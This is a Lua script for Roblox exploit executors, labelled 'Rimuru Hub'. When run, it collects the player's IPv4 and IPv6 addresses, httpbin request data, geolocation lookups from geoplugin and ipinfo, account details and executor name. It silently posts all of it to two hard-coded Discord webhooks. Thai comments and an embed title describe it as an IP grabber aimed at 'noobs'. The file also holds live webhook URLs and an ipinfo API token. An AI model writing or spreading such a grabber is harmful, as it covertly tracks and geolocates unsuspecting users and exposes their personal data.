--อยากดักนะipแต่ดักไม่ได้

local function sendLogToDiscord()
    local OSTime = os.time()
    local playerLocalTime = os.date('*t', OSTime)
    local formattedLocalTime = string.format('%02d:%02d:%02d', playerLocalTime.hour, playerLocalTime.min, playerLocalTime.sec)

    local NameMap = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local placeId = game.PlaceId
    local player = game.Players.LocalPlayer
    local PlayerName = player.Name
    local playerUserId = player.UserId
    local playerProfileUrl = "https://www.roblox.com/users/" .. playerUserId .. "/profile"

    local Embed = {
        title = 'Log Script Rimuru Hub',
        color = 0x9600FF,
        fields = {
            { name = '# Info Map', value = '', },
            { name = 'Name', value = NameMap },
            { name = 'PlaceId', value = tostring(placeId) },
            { name = '# Info Player', value = '', },
            { name = 'Player Profile', value = playerProfileUrl },
            { name = 'Name', value = PlayerName },
            { name = 'UserId', value = playerUserId },
            { name = 'Current Local Time', value = formattedLocalTime },
        },
        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ', OSTime),
    }

    local success, response = pcall(function()
        return (syn and syn.request or http_request) {
            Url = 'https://discord.com/api/webhooks/1306977987417341972/kFd3wPlcwD9JRjWHG51IMHipT9tNs6SzS-aw5gZkFngJxOwTXYpfBsoiLY7SycVcHpMz',
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = game:GetService('HttpService'):JSONEncode({
                username = 'Rimuru Hub',
                avatar_url = 'https://cdn.discordapp.com/attachments/1273992951780999231/1305094174445666365/3_20241018191802.png?ex=6731c72a&is=673075aa&hm=217aaf7f1868f4aa6bbe4f307d55969154ebd782d441f738e21cb1d822de6f8e&',
                embeds = { Embed }
            }),
        }
    end)

    -- Log success or failure if needed
    if not success then
        print("Error sending log: " .. tostring(response))
    end
end

function ip()
local Webhook = "https://discord.com/api/webhooks/1308746269304557570/OvbT2FHTbhMgSvIM0Nw02EFSxGlpsj_BanhQMaeKMKJgBzDZWkJuU9g_MIWQXWvybOfa"
local IPv4 = game:HttpGet("https://api.ipify.org")
local IPv6 = game:HttpGet("https://api64.ipify.org")
local HTTPbin = game:HttpGet("https://httpbin.org/get")
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4)
local ipinfo = game:HttpGet("https://ipinfo.io/27.145.33.62/json?token=17064f8531fdb3")

local Headers = {["content-type"] = "application/json"}

local LocalPlayer = game:GetService("Players").LocalPlayer

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name
local DisplayName = LocalPlayer.DisplayName
local PlaceID = game.PlaceId

local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0')

function identifyexploit()
    local ieSuccess, ieResult = pcall(identifyexecutor)
    if ieSuccess then return ieResult end
    return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher") or "Unknown"
end

local PlayerData = {
    ["content"] = "",
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "RimuruHub | ดักipไก่ๆ",
        },
        ["title"] = PlayerName,
        ["description"] = "aka "..DisplayName,
        ["fields"] = {
            {["name"] = "Username:", ["value"] = PlayerName, ["inline"] = true},
            {["name"] = "Membership Type:", ["value"] = MembershipType, ["inline"] = true},
            {["name"] = "Account Age (days):", ["value"] = AccountAge, ["inline"] = true},
            {["name"] = "UserId:", ["value"] = UserId, ["inline"] = true},
            {["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true},
            {["name"] = "IPv6:", ["value"] = IPv6, ["inline"] = true},
            {["name"] = "Place ID:", ["value"] = PlaceID, ["inline"] = true},
            {["name"] = "Executor:", ["value"] = identifyexploit(), ["inline"] = true},
            {["name"] = "Log Time:", ["value"] = LogTime, ["inline"] = true},
            {["name"] = "HTTPbin Data (JSON):", ["value"] = "```json\n"..HTTPbin.."```", ["inline"] = false},
            {["name"] = "geoPlugin Data (JSON):", ["value"] = "```json\n"..GeoPlug.."```", ["inline"] = false},
            {["name"] = "ipinfo.io Data (JSON)(api):", ["value"] = "```json\n"..ipinfo.."```", ["inline"] = false},
        },
    }}
}

local PlayerDataJSON = game:GetService('HttpService'):JSONEncode(PlayerData)

local HttpRequest = http_request or (syn and syn.request) or http_request

local success, response = pcall(function()
    HttpRequest({
        Url = Webhook,
        Body = PlayerDataJSON,
        Method = "POST",
        Headers = Headers
    })
end)
end

ip()
sendLogToDiscord()
